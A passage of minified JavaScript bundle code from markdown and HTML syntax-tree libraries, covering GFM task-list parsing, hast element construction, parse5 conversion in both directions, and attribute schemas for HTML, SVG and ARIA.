h===93?(e.enter("taskListCheckMarker"),e.consume(h),e.exit("taskListCheckMarker"),e.exit("taskListCheck"),f):n(h)}function f(h){return Xe(h)?t(h):ct(h)?e.check({tokenize:nF},t,n)(h):n(h)}}function nF(e,t,n){return ft(e,r,"whitespace");function r(a){return a===null?n(a):t(a)}}function rF(e){return Zk([AO(),MO(),YO(e),KO(),eF()])}const iF={};function aF(e){const t=this,n=e||iF,r=t.data(),a=r.micromarkExtensions||(r.micromarkExtensions=[]),l=r.fromMarkdownExtensions||(r.fromMarkdownExtensions=[]),u=r.toMarkdownExtensions||(r.toMarkdownExtensions=[]);a.push(rF(n)),l.push(TO()),u.push(CO(n))}const a2=/[#.]/g;function sF(e,t){const n=e||"",r={};let a=0,l,u;for(;a<n.length;){a2.lastIndex=a;const f=a2.exec(n),h=n.slice(a,f?f.index:n.length);h&&(l?l==="#"?r.id=h:Array.isArray(r.className)?r.className.push(h):r.className=[h]:u=h,a+=h.length),f&&(l=f[0],a++)}return{type:"element",tagName:u||t||"div",properties:r,children:[]}}function $T(e,t,n){const r=n?cF(n):void 0;function a(l,u,...f){let h;if(l==null){h={type:"root",children:[]};const m=u;f.unshift(m)}else{h=sF(l,t);const m=h.tagName.toLowerCase(),x=r?r.get(m):void 0;if(h.tagName=x||m,lF(u))f.unshift(u);else for(const[g,b]of Object.entries(u))oF(e,h.properties,g,b)}for(const m of f)R0(h.children,m);return h.type==="element"&&h.tagName==="template"&&(h.content={type:"root",children:h.children},h.children=[]),h}return a}function lF(e){if(e===null||typeof e!="object"||Array.isArray(e))return!0;if(typeof e.type!="string")return!1;const t=e,n=Object.keys(e);for(const r of n){const a=t[r];if(a&&typeof a=="object"){if(!Array.isArray(a))return!0;const l=a;for(const u of l)if(typeof u!="number"&&typeof u!="string")return!0}}return!!("children"in e&&Array.isArray(e.children))}function oF(e,t,n,r){const a=sx(e,n);let l;if(r!=null){if(typeof r=="number"){if(Number.isNaN(r))return;l=r}else typeof r=="boolean"?l=r:typeof r=="string"?a.spaceSeparated?l=fb(r):a.commaSeparated?l=lb(r):a.commaOrSpaceSeparated?l=fb(lb(r).join(" ")):l=s2(a,a.property,r):Array.isArray(r)?l=[...r]:l=a.property==="style"?uF(r):String(r);if(Array.isArray(l)){const u=[];for(const f of l)u.push(s2(a,a.property,f));l=u}a.property==="className"&&Array.isArray(t.className)&&(l=t.className.concat(l)),t[a.property]=l}}function R0(e,t){if(t!=null)if(typeof t=="number"||typeof t=="string")e.push({type:"text",value:String(t)});else if(Array.isArray(t))for(const n of t)R0(e,n);else if(typeof t=="object"&&"type"in t)t.type==="root"?R0(e,t.children):e.push(t);else throw new Error("Expected node, nodes, or string, got `"+t+"`")}function s2(e,t,n){if(typeof n=="string"){if(e.number&&n&&!Number.isNaN(Number(n)))return Number(n);if((e.boolean||e.overloadedBoolean)&&(n===""||Fu(n)===Fu(t)))return!0}return n}function uF(e){const t=[];for(const[n,r]of Object.entries(e))t.push([n,r].join(": "));return t.join("; ")}function cF(e){const t=new Map;for(const n of e)t.set(n.toLowerCase(),n);return t}const dF=["altGlyph","altGlyphDef","altGlyphItem","animateColor","animateMotion","animateTransform","clipPath","feBlend","feColorMatrix","feComponentTransfer","feComposite","feConvolveMatrix","feDiffuseLighting","feDisplacementMap","feDistantLight","feDropShadow","feFlood","feFuncA","feFuncB","feFuncG","feFuncR","feGaussianBlur","feImage","feMerge","feMergeNode","feMorphology","feOffset","fePointLight","feSpecularLighting","feSpotLight","feTile","feTurbulence","foreignObject","glyphRef","linearGradient","radialGradient","solidColor","textArea","textPath"],fF=$T(lh,"div"),hF=$T(zl,"g",dF);function pF(e){const t=String(e),n=[];return{toOffset:a,toPoint:r};function r(l){if(typeof l=="number"&&l>-1&&l<=t.length){let u=0;for(;;){let f=n[u];if(f===void 0){const h=l2(t,n[u-1]);f=h===-1?t.length+1:h+1,n[u]=f}if(f>l)return{line:u+1,column:l-(u>0?n[u-1]:0)+1,offset:l};u++}}}function a(l){if(l&&typeof l.line=="number"&&typeof l.column=="number"&&!Number.isNaN(l.line)&&!Number.isNaN(l.column)){for(;n.length<l.line;){const f=n[n.length-1],h=l2(t,f),m=h===-1?t.length+1:h+1;if(f===m)break;n.push(m)}const u=(l.line>1?n[l.line-2]:0)+l.column-1;if(u<n[l.line-1])return u}}}function l2(e,t){const n=e.indexOf("\r",t),r=e.indexOf(`
`,t);return r===-1?n:n===-1||n+1===r?r:n<r?n:r}const is={html:"http://www.w3.org/1999/xhtml",mathml:"http://www.w3.org/1998/Math/MathML",svg:"http://www.w3.org/2000/svg",xlink:"http://www.w3.org/1999/xlink",xml:"http://www.w3.org/XML/1998/namespace",xmlns:"http://www.w3.org/2000/xmlns/"},YT={}.hasOwnProperty,mF=Object.prototype;function gF(e,t){const n=t||{};return wx({file:n.file||void 0,location:!1,schema:n.space==="svg"?zl:lh,verbose:n.verbose||!1},e)}function wx(e,t){let n;switch(t.nodeName){case"#comment":{const r=t;return n={type:"comment",value:r.data},Pd(e,r,n),n}case"#document":case"#document-fragment":{const r=t,a="mode"in r?r.mode==="quirks"||r.mode==="limited-quirks":!1;if(n={type:"root",children:VT(e,t.childNodes),data:{quirksMode:a}},e.file&&e.location){const l=String(e.file),u=pF(l),f=u.toPoint(0),h=u.toPoint(l.length);n.position={start:f,end:h}}return n}case"#documentType":{const r=t;return n={type:"doctype"},Pd(e,r,n),n}case"#text":{const r=t;return n={type:"text",value:r.value},Pd(e,r,n),n}default:return n=xF(e,t),n}}function VT(e,t){let n=-1;const r=[];for(;++n<t.length;){const a=wx(e,t[n]);r.push(a)}return r}function xF(e,t){const n=e.schema;e.schema=t.namespaceURI===is.svg?zl:lh;let r=-1;const a={};for(;++r<t.attrs.length;){const f=t.attrs[r],h=(f.prefix?f.prefix+":":"")+f.name;YT.call(mF,h)||(a[h]=f.value)}const u=(e.schema.space==="svg"?hF:fF)(t.tagName,a,VT(e,t.childNodes));if(Pd(e,t,u),u.tagName==="template"){const f=t,h=f.sourceCodeLocation,m=h&&h.startTag&&ol(h.startTag),x=h&&h.endTag&&ol(h.endTag),g=wx(e,f.content);m&&x&&e.file&&(g.position={start:m.end,end:x.start}),u.content=g}return e.schema=n,u}function Pd(e,t,n){if("sourceCodeLocation"in t&&t.sourceCodeLocation&&e.file){const r=yF(e,n,t.sourceCodeLocation);r&&(e.location=!0,n.position=r)}}function yF(e,t,n){const r=ol(n);if(t.type==="element"){const a=t.children[t.children.length-1];if(r&&!n.endTag&&a&&a.position&&a.position.end&&(r.end=Object.assign({},a.position.end)),e.verbose){const l={};let u;if(n.attrs)for(u in n.attrs)YT.call(n.attrs,u)&&(l[sx(e.schema,u).property]=ol(n.attrs[u]));n.startTag;const f=ol(n.startTag),h=n.endTag?ol(n.endTag):void 0,m={opening:f};h&&(m.closing=h),m.properties=l,t.data={position:m}}}return r}function ol(e){const t=o2({line:e.startLine,column:e.startCol,offset:e.startOffset}),n=o2({line:e.endLine,column:e.endCol,offset:e.endOffset});return t||n?{start:t,end:n}:void 0}function o2(e){return e.line&&e.column?e:void 0}class ic{constructor(t,n,r){this.property=t,this.normal=n,r&&(this.space=r)}}ic.prototype.property={};ic.prototype.normal={};ic.prototype.space=null;function GT(e,t){const n={},r={};let a=-1;for(;++a<e.length;)Object.assign(n,e[a].property),Object.assign(r,e[a].normal);return new ic(n,r,t)}function O0(e){return e.toLowerCase()}class Fr{constructor(t,n){this.property=t,this.attribute=n}}Fr.prototype.space=null;Fr.prototype.boolean=!1;Fr.prototype.booleanish=!1;Fr.prototype.overloadedBoolean=!1;Fr.prototype.number=!1;Fr.prototype.commaSeparated=!1;Fr.prototype.spaceSeparated=!1;Fr.prototype.commaOrSpaceSeparated=!1;Fr.prototype.mustUseProperty=!1;Fr.prototype.defined=!1;let vF=0;const rt=Es(),ln=Es(),QT=Es(),Ae=Es(),_t=Es(),vl=Es(),mr=Es();function Es(){return 2**++vF}const F0=Object.freeze(Object.defineProperty({__proto__:null,boolean:rt,booleanish:ln,commaOrSpaceSeparated:mr,commaSeparated:vl,number:Ae,overloadedBoolean:QT,spaceSeparated:_t},Symbol.toStringTag,{value:"Module"})),xm=Object.keys(F0);class kx extends Fr{constructor(t,n,r,a){let l=-1;if(super(t,n),u2(this,"space",a),typeof r=="number")for(;++l<xm.length;){const u=xm[l];u2(this,xm[l],(r&F0[u])===F0[u])}}}kx.prototype.defined=!0;function u2(e,t,n){n&&(e[t]=n)}const bF={}.hasOwnProperty;function ql(e){const t={},n={};let r;for(r in e.properties)if(bF.call(e.properties,r)){const a=e.properties[r],l=new kx(r,e.transform(e.attributes||{},r),a,e.space);e.mustUseProperty&&e.mustUseProperty.includes(r)&&(l.mustUseProperty=!0),t[r]=l,n[O0(r)]=r,n[O0(l.attribute)]=r}return new ic(t,n,e.space)}const KT=ql({space:"xlink",transform(e,t){return"xlink:"+t.slice(5).toLowerCase()},properties:{xLinkActuate:null,xLinkArcRole:null,xLinkHref:null,xLinkRole:null,xLinkShow:null,xLinkTitle:null,xLinkType:null}}),XT=ql({space:"xml",transform(e,t){return"xml:"+t.slice(3).toLowerCase()},properties:{xmlLang:null,xmlBase:null,xmlSpace:null}});function ZT(e,t){return t in e?e[t]:t}function JT(e,t){return ZT(e,t.toLowerCase())}const eC=ql({space:"xmlns",attributes:{xmlnsxlink:"xmlns:xlink"},transform:JT,properties:{xmlns:null,xmlnsXLink:null}}),tC=ql({transform(e,t){return t==="role"?t:"aria-"+t.slice(4).toLowerCase()},properties:{ariaActiveDescendant:null,ariaAtomic:ln,ariaAutoComplete:null,ariaBusy:ln,ariaChecked:ln,ariaColCount:Ae,ariaColIndex:Ae,ariaColSpan:Ae,ariaControls:_t,ariaCurrent:null,ariaDescribedBy:_t,ariaDetails:null,ariaDisabled:ln,ariaDropEffect:_t,ariaErrorMessage:null,ariaExpanded:ln,ariaFlowTo:_t,ariaGrabbed:ln,ariaHasPopup:null,ariaHidden:ln,ariaInvalid:null,ariaKeyShortcuts:null,ariaLabel:null,ariaLabelledBy:_t,ariaLevel:Ae,ariaLive:null,ariaModal:ln,ariaMultiLine:ln,ariaMultiSelectable:ln,ariaOrientation:null,ariaOwns:_t,ariaPlaceholder:null,ariaPosInSet:Ae,ariaPressed:ln,ariaReadOnly:ln,ariaRelevant:null,ariaRequired:ln,ariaRoleDescription:_t,ariaRowCount:Ae,ariaRowIndex:Ae,ariaRowSpan:Ae,ariaSelected:ln,ariaSetSize:Ae,ariaSort:null,ariaValueMax:Ae,ariaValueMin:Ae,ariaValueNow:Ae,ariaValueText:null,role:null}}),EF=ql({space:"html",attributes:{acceptcharset:"accept-charset",classname:"class",htmlfor:"for",httpequiv:"http-equiv"},transform:JT,mustUseProperty:["checked","multiple","muted","selected"],properties:{abbr:null,accept:vl,acceptCharset:_t,accessKey:_t,action:null,allow:null,allowFullScreen:rt,allowPaymentRequest:rt,allowUserMedia:rt,alt:null,as:null,async:rt,autoCapitalize:null,autoComplete:_t,autoFocus:rt,autoPlay:rt,blocking:_t,capture:null,charSet:null,checked:rt,cite:null,className:_t,cols:Ae,colSpan:null,content:null,contentEditable:ln,controls:rt,controlsList:_t,coords:Ae|vl,crossOrigin:null,data:null,dateTime:null,decoding:null,default:rt,defer:rt,dir:null,dirName:null,disabled:rt,download:QT,draggable:ln,encType:null,enterKeyHint:null,fetchPriority:null,form:null,formAction:null,formEncType:null,formMethod:null,formNoValidate:rt,formTarget:null,headers:_t,height:Ae,hidden:rt,high:Ae,href:null,hrefLang:null,htmlFor:_t,httpEquiv:_t,id:null,imageSizes:null,imageSrcSet:null,inert:rt,inputMode:null,integrity:null,is:null,isMap:rt,itemId:null,itemProp:_t,itemRef:_t,itemScope:rt,itemType:_t,kind:null,label:null,lang:null,language:null,list:null,loading:null,loop:rt,low:Ae,manifest:null,max:null,maxLength:Ae,media:null,method:null,min:null,minLength:Ae,multiple:rt,muted:rt,name:null,nonce:null,noModule:rt,noValidate:rt,onAbort:null,onAfterPrint:null,onAuxClick:null,onBeforeMatch:null,onBeforePrint:null,onBeforeToggle:null,onBeforeUnload:null,onBlur:null,onCancel:null,onCanPlay:null,onCanPlayThrough:null,onChange:null,onClick:null,onClose:null,onContextLost:null,onContextMenu:null,onContextRestored:null,onCopy:null,onCueChange:null,onCut:null,onDblClick:null,onDrag:null,onDragEnd:null,onDragEnter:null,onDragExit:null,onDragLeave:null,onDragOver:null,onDragStart:null,onDrop:null,onDurationChange:null,onEmptied:null,onEnded:null,onError:null,onFocus:null,onFormData:null,onHashChange:null,onInput:null,onInvalid:null,onKeyDown:null,onKeyPress:null,onKeyUp:null,onLanguageChange:null,onLoad:null,onLoadedData:null,onLoadedMetadata:null,onLoadEnd:null,onLoadStart:null,onMessage:null,onMessageError:null,onMouseDown:null,onMouseEnter:null,onMouseLeave:null,onMouseMove:null,onMouseOut:null,onMouseOver:null,onMouseUp:null,onOffline:null,onOnline:null,onPageHide:null,onPageShow:null,onPaste:null,onPause:null,onPlay:null,onPlaying:null,onPopState:null,onProgress:null,onRateChange:null,onRejectionHandled:null,onReset:null,onResize:null,onScroll:null,onScrollEnd:null,onSecurityPolicyViolation:null,onSeeked:null,onSeeking:null,onSelect:null,onSlotChange:null,onStalled:null,onStorage:null,onSubmit:null,onSuspend:null,onTimeUpdate:null,onToggle:null,onUnhandledRejection:null,onUnload:null,onVolumeChange:null,onWaiting:null,onWheel:null,open:rt,optimum:Ae,pattern:null,ping:_t,placeholder:null,playsInline:rt,popover:null,popoverTarget:null,popoverTargetAction:null,poster:null,preload:null,readOnly:rt,referrerPolicy:null,rel:_t,required:rt,reversed:rt,rows:Ae,rowSpan:Ae,sandbox:_t,scope:null,scoped:rt,seamless:rt,selected:rt,shadowRootClonable:rt,shadowRootDelegatesFocus:rt,shadowRootMode:null,shape:null,size:Ae,sizes:null,slot:null,span:Ae,spellCheck:ln,src:null,srcDoc:null,srcLang:null,srcSet:null,start:Ae,step:null,style:null,tabIndex:Ae,target:null,title:null,translate:null,type:null,typeMustMatch:rt,useMap:null,value:ln,width:Ae,wrap:null,writingSuggestions:null,align:null,aLink:null,archive:_t,axis:null,background:null,bgColor:null,border:Ae,borderColor:null,bottomMargin:Ae,cellPadding:null,cellSpacing:null,char:null,charOff:null,classId:null,clear:null,code:null,codeBase:null,codeType:null,color:null,compact:rt,declare:rt,event:null,face:null,frame:null,frameBorder:null,hSpace:Ae,leftMargin:Ae,link:null,longDesc:null,lowSrc:null,marginHeight:Ae,marginWidth:Ae,noResize:rt,noHref:rt,noShade:rt,noWrap:rt,object:null,profile:null,prompt:null,rev:null,rightMargin:Ae,rules:null,scheme:null,scrolling:ln,standby:null,summary:null,text:null,topMargin:Ae,valueType:null,version:null,vAlign:null,vLink:null,vSpace:Ae,allowTransparency:null,autoCorrect:null,autoSave:null,disablePictureInPicture:rt,disableRemotePlayback:rt,prefix:null,property:null,results:Ae,security:null,unselectable:null}}),wF=ql({space:"svg",attributes:{accentHeight:"accent-height",alignmentBaseline:"alignment-baseline",arabicForm:"arabic-form",baselineShift:"baseline-shift",capHeight:"cap-height",className:"class",clipPath:"clip-path",clipRule:"clip-rule",colorInterpolation:"color-interpolation",colorInterpolationFilters:"color-interpolation-filters",colorProfile:"color-profile",colorRendering:"color-rendering",crossOrigin:"crossorigin",dataType:"datatype",dominantBaseline:"dominant-baseline",enableBackground:"enable-background",fillOpacity:"fill-opacity",fillRule:"fill-rule",floodColor:"flood-color",floodOpacity:"flood-opacity",fontFamily:"font-family",fontSize:"font-size",fontSizeAdjust:"font-size-adjust",fontStretch:"font-stretch",fontStyle:"font-style",fontVariant:"font-variant",fontWeight:"font-weight",glyphName:"glyph-name",glyphOrientationHorizontal:"glyph-orientation-horizontal",glyphOrientationVertical:"glyph-orientation-vertical",hrefLang:"hreflang",horizAdvX:"horiz-adv-x",horizOriginX:"horiz-origin-x",horizOriginY:"horiz-origin-y",imageRendering:"image-rendering",letterSpacing:"letter-spacing",lightingColor:"lighting-color",markerEnd:"marker-end",markerMid:"marker-mid",markerStart:"marker-start",navDown:"nav-down",navDownLeft:"nav-down-left",navDownRight:"nav-down-right",navLeft:"nav-left",navNext:"nav-next",navPrev:"nav-prev",navRight:"nav-right",navUp:"nav-up",navUpLeft:"nav-up-left",navUpRight:"nav-up-right",onAbort:"onabort",onActivate:"onactivate",onAfterPrint:"onafterprint",onBeforePrint:"onbeforeprint",onBegin:"onbegin",onCancel:"oncancel",onCanPlay:"oncanplay",onCanPlayThrough:"oncanplaythrough",onChange:"onchange",onClick:"onclick",onClose:"onclose",onCopy:"oncopy",onCueChange:"oncuechange",onCut:"oncut",onDblClick:"ondblclick",onDrag:"ondrag",onDragEnd:"ondragend",onDragEnter:"ondragenter",onDragExit:"ondragexit",onDragLeave:"ondragleave",onDragOver:"ondragover",onDragStart:"ondragstart",onDrop:"ondrop",onDurationChange:"ondurationchange",onEmptied:"onemptied",onEnd:"onend",onEnded:"onended",onError:"onerror",onFocus:"onfocus",onFocusIn:"onfocusin",onFocusOut:"onfocusout",onHashChange:"onhashchange",onInput:"oninput",onInvalid:"oninvalid",onKeyDown:"onkeydown",onKeyPress:"onkeypress",onKeyUp:"onkeyup",onLoad:"onload",onLoadedData:"onloadeddata",onLoadedMetadata:"onloadedmetadata",onLoadStart:"onloadstart",onMessage:"onmessage",onMouseDown:"onmousedown",onMouseEnter:"onmouseenter",onMouseLeave:"onmouseleave",onMouseMove:"onmousemove",onMouseOut:"onmouseout",onMouseOver:"onmouseover",onMouseUp:"onmouseup",onMouseWheel:"onmousewheel",onOffline:"onoffline",onOnline:"ononline",onPageHide:"onpagehide",onPageShow:"onpageshow",onPaste:"onpaste",onPause:"onpause",onPlay:"onplay",onPlaying:"onplaying",onPopState:"onpopstate",onProgress:"onprogress",onRateChange:"onratechange",onRepeat:"onrepeat",onReset:"onreset",onResize:"onresize",onScroll:"onscroll",onSeeked:"onseeked",onSeeking:"onseeking",onSelect:"onselect",onShow:"onshow",onStalled:"onstalled",onStorage:"onstorage",onSubmit:"onsubmit",onSuspend:"onsuspend",onTimeUpdate:"ontimeupdate",onToggle:"ontoggle",onUnload:"onunload",onVolumeChange:"onvolumechange",onWaiting:"onwaiting",onZoom:"onzoom",overlinePosition:"overline-position",overlineThickness:"overline-thickness",paintOrder:"paint-order",panose1:"panose-1",pointerEvents:"pointer-events",referrerPolicy:"referrerpolicy",renderingIntent:"rendering-intent",shapeRendering:"shape-rendering",stopColor:"stop-color",stopOpacity:"stop-opacity",strikethroughPosition:"strikethrough-position",strikethroughThickness:"strikethrough-thickness",strokeDashArray:"stroke-dasharray",strokeDashOffset:"stroke-dashoffset",strokeLineCap:"stroke-linecap",strokeLineJoin:"stroke-linejoin",strokeMiterLimit:"stroke-miterlimit",strokeOpacity:"stroke-opacity",strokeWidth:"stroke-width",tabIndex:"tabindex",textAnchor:"text-anchor",textDecoration:"text-decoration",textRendering:"text-rendering",transformOrigin:"transform-origin",typeOf:"typeof",underlinePosition:"underline-position",underlineThickness:"underline-thickness",unicodeBidi:"unicode-bidi",unicodeRange:"unicode-range",unitsPerEm:"units-per-em",vAlphabetic:"v-alphabetic",vHanging:"v-hanging",vIdeographic:"v-ideographic",vMathematical:"v-mathematical",vectorEffect:"vector-effect",vertAdvY:"vert-adv-y",vertOriginX:"vert-origin-x",vertOriginY:"vert-origin-y",wordSpacing:"word-spacing",writingMode:"writing-mode",xHeight:"x-height",playbackOrder:"playbackorder",timelineBegin:"timelinebegin"},transform:ZT,properties:{about:mr,accentHeight:Ae,accumulate:null,additive:null,alignmentBaseline:null,alphabetic:Ae,amplitude:Ae,arabicForm:null,ascent:Ae,attributeName:null,attributeType:null,azimuth:Ae,bandwidth:null,baselineShift:null,baseFrequency:null,baseProfile:null,bbox:null,begin:null,bias:Ae,by:null,calcMode:null,capHeight:Ae,className:_t,clip:null,clipPath:null,clipPathUnits:null,clipRule:null,color:null,colorInterpolation:null,colorInterpolationFilters:null,colorProfile:null,colorRendering:null,content:null,contentScriptType:null,contentStyleType:null,crossOrigin:null,cursor:null,cx:null,cy:null,d:null,dataType:null,defaultAction:null,descent:Ae,diffuseConstant:Ae,direction:null,display:null,dur:null,divisor:Ae,dominantBaseline:null,download:rt,dx:null,dy:null,edgeMode:null,editable:null,elevation:Ae,enableBackground:null,end:null,event:null,exponent:Ae,externalResourcesRequired:null,fill:null,fillOpacity:Ae,fillRule:null,filter:null,filterRes:null,filterUnits:null,floodColor:null,floodOpacity:null,focusable:null,focusHighlight:null,fontFamily:null,fontSize:null,fontSizeAdjust:null,fontStretch:null,fontStyle:null,fontVariant:null,fontWeight:null,format:null,fr:null,from:null,fx:null,fy:null,g1:vl,g2:vl,glyphName:vl,glyphOrientationHorizontal:null,glyphOrientationVertical:null,glyphRef:null,gradientTransform:null,gradientUnits:null,handler:null,hanging:Ae,hatchContentUnits:null,hatchUnits:null,height:null,href:null,hrefLang:null,horizAdvX:Ae,horizOriginX:Ae,horizOriginY:Ae,id:null,ideographic:Ae,imageRendering:null,initialVisibility:null,in:null,in2:null,intercept:Ae,k:Ae,k1:Ae,k2:Ae,k3:Ae,k4:Ae,kernelMatrix:mr,kernelUnitLength:null,keyPoints:null,keySplines:null,keyTimes:null,kerning:null,lang:null,lengthAdjust:null,letterSpacing:null,lightingColor:null,limitingConeAngle:Ae,local:null,markerEnd:null,markerMid:null,markerStart:null,markerHeight:null,markerUnits:null,markerWidth:null,mask:null,maskContentUnits:null,maskUnits:null,mathematical:null,max:null,media:null,mediaCharacterEncoding:null,mediaContentEncodings:null,mediaSize:Ae,mediaTime:null,method:null,min:null,mode:null,name:null,navDown:null,navDownLeft:null,navDownRight:null,navLeft:null,navNext:null,navPrev:null,navRight:null,navUp:null,navUpLeft:null,navUpRight:null,numOctaves:null,observer:null,offset:null,onAbort:null,onActivate:null,onAfterPrint:null,onBeforePrint:null,onBegin:null,onCancel:null,onCanPlay:null,onCanPlayThrough:null,onChange:null,onClick:null,onClose:null,onCopy:null,onCueChange:null,onCut:null,onDblClick:null,onDrag:null,onDragEnd:null,onDragEnter:null,onDragExit:null,onDragLeave:null,onDragOver:null,onDragStart:null,onDrop:null,onDurationChange:null,onEmptied:null,onEnd:null,onEnded:null,onError:null,onFocus:null,onFocusIn:null,onFocusOut:null,onHashChange:null,onInput:null,onInvalid:null,onKeyDown:null,onKeyPress:null,onKeyUp:null,onLoad:null,onLoadedData:null,onLoadedMetadata:null,onLoadStart:null,onMessage:null,onMouseDown:null,onMouseEnter:null,onMouseLeave:null,onMouseMove:null,onMouseOut:null,onMouseOver:null,onMouseUp:null,onMouseWheel:null,onOffline:null,onOnline:null,onPageHide:null,onPageShow:null,onPaste:null,onPause:null,onPlay:null,onPlaying:null,onPopState:null,onProgress:null,onRateChange:null,onRepeat:null,onReset:null,onResize:null,onScroll:null,onSeeked:null,onSeeking:null,onSelect:null,onShow:null,onStalled:null,onStorage:null,onSubmit:null,onSuspend:null,onTimeUpdate:null,onToggle:null,onUnload:null,onVolumeChange:null,onWaiting:null,onZoom:null,opacity:null,operator:null,order:null,orient:null,orientation:null,origin:null,overflow:null,overlay:null,overlinePosition:Ae,overlineThickness:Ae,paintOrder:null,panose1:null,path:null,pathLength:Ae,patternContentUnits:null,patternTransform:null,patternUnits:null,phase:null,ping:_t,pitch:null,playbackOrder:null,pointerEvents:null,points:null,pointsAtX:Ae,pointsAtY:Ae,pointsAtZ:Ae,preserveAlpha:null,preserveAspectRatio:null,primitiveUnits:null,propagate:null,property:mr,r:null,radius:null,referrerPolicy:null,refX:null,refY:null,rel:mr,rev:mr,renderingIntent:null,repeatCount:null,repeatDur:null,requiredExtensions:mr,requiredFeatures:mr,requiredFonts:mr,requiredFormats:mr,resource:null,restart:null,result:null,rotate:null,rx:null,ry:null,scale:null,seed:null,shapeRendering:null,side:null,slope:null,snapshotTime:null,specularConstant:Ae,specularExponent:Ae,spreadMethod:null,spacing:null,startOffset:null,stdDeviation:null,stemh:null,stemv:null,stitchTiles:null,stopColor:null,stopOpacity:null,strikethroughPosition:Ae,strikethroughThickness:Ae,string:null,stroke:null,strokeDashArray:mr,strokeDashOffset:null,strokeLineCap:null,strokeLineJoin:null,strokeMiterLimit:Ae,strokeOpacity:Ae,strokeWidth:null,style:null,surfaceScale:Ae,syncBehavior:null,syncBehaviorDefault:null,syncMaster:null,syncTolerance:null,syncToleranceDefault:null,systemLanguage:mr,tabIndex:Ae,tableValues:null,target:null,targetX:Ae,targetY:Ae,textAnchor:null,textDecoration:null,textRendering:null,textLength:null,timelineBegin:null,title:null,transformBehavior:null,type:null,typeOf:mr,to:null,transform:null,transformOrigin:null,u1:null,u2:null,underlinePosition:Ae,underlineThickness:Ae,unicode:null,unicodeBidi:null,unicodeRange:null,unitsPerEm:Ae,values:null,vAlphabetic:Ae,vMathematical:Ae,vectorEffect:null,vHanging:Ae,vIdeographic:Ae,version:null,vertAdvY:Ae,vertOriginX:Ae,vertOriginY:Ae,viewBox:null,viewTarget:null,visibility:null,width:null,widths:null,wordSpacing:null,writingMode:null,x:null,x1:null,x2:null,xChannelSelector:null,xHeight:Ae,y:null,y1:null,y2:null,yChannelSelector:null,z:null,zoomAndPan:null}}),kF=/^data[-\w.:]+$/i,c2=/-[a-z]/g,TF=/[A-Z]/g;function CF(e,t){const n=O0(t);let r=t,a=Fr;if(n in e.normal)return e.property[e.normal[n]];if(n.length>4&&n.slice(0,4)==="data"&&kF.test(t)){if(t.charAt(4)==="-"){const l=t.slice(5).replace(c2,NF);r="data"+l.charAt(0).toUpperCase()+l.slice(1)}else{const l=t.slice(4);if(!c2.test(l)){let u=l.replace(TF,SF);u.charAt(0)!=="-"&&(u="-"+u),t="data"+u}}a=kx}return new a(r,t)}function SF(e){return"-"+e.toLowerCase()}function NF(e){return e.charAt(1).toUpperCase()}const AF=GT([XT,KT,eC,tC,EF],"html"),nC=GT([XT,KT,eC,tC,wF],"svg"),DF={},LF={}.hasOwnProperty,rC=CT("type",{handlers:{root:IF,element:FF,text:RF,comment:OF,doctype:jF}});function _F(e,t){const r=(t||DF).space;return rC(e,r==="svg"?nC:AF)}function IF(e,t){const n={nodeName:"#document",mode:(e.data||{}).quirksMode?"quirks":"no-quirks",childNodes:[]};return n.childNodes=Tx(e.children,n,t),$l(e,n),n}function PF(e,t){const n={nodeName:"#document-fragment",childNodes:[]};return n.childNodes=Tx(e.children,n,t),$l(e,n),n}function jF(e){const t={nodeName:"#documentType",name:"html",publicId:"",systemId:"",parentNode:null};return $l(e,t),t}function RF(e){const t={nodeName:"#text",value:e.value,parentNode:null};return $l(e,t),t}function OF(e){const t={nodeName:"#comment",data:e.value,parentNode:null};return $l(e,t),t}function FF(e,t){const n=t;let r=n;e.type==="element"&&e.tagName.toLowerCase()==="svg"&&n.space==="html"&&(r=nC);const a=[];let l;if(e.properties){for(l in e.properties)if(l!=="children"&&LF.call(e.properties,l)){const h=MF(r,l,e.properties[l]);h&&a.push(h)}}const u=r.space,f={nodeName:e.tagName,tagName:e.tagName,attrs:a,namespaceURI:is[u],childNodes:[],parentNode:null};return f.childNodes=Tx(e.children,f,r),$l(e,f),e.tagName==="template"&&e.content&&(f.content=PF(e.content,r)),f}function MF(e,t,n){const r=CF(e,t);if(n===!1||n===null||n===void 0||typeof n=="number"&&Number.isNaN(n)||!n&&r.boolean)return;Array.isArray(n)&&(n=r.commaSeparated?Ok(n):qk(n));const a={name:r.attribute,value:n===!0?"":String(n)};if(r.space&&r.space!=="html"&&r.space!=="svg"){const l=a.name.indexOf(":");l<0?a.prefix="":(a.name=a.name.slice(l+1),a.prefix=r.attribute.slice(0,l)),a.namespace=is[r.space]}return a}function Tx(e,t,n){let r=-1;const a=[];if(e)for(;++r<e.length;){const l=rC(e[r],n);l.parentNode=t,a.push(l)}return a}function $l(e,t){const n=e.position;n&&n.start&&n.end&&(n.start.offset,n.end.offset,t.sourceCodeLocation={startLine:n.start.line,startCol:n.start.column,startOffset:n.start.offset,endLine:n.end.line,endCol:n.end.column,endOffset:n.end.offset})}const BF=["area","base","basefont","bgsound","br","col","command","embed","frame","hr","image","img","input","keygen","link","meta","param","source","track","wbr"],HF=new Set([65534,65535,131070,131071,196606,196607,262142,262143,327678,327679,393214,393215,458750,458751,524286,524287,589822,589823,655358,655359,720894,720895,786430,786431,851966,851967,917502,917503,983038,983039,1048574,1048575,1114110,1114111]),Ut="";var 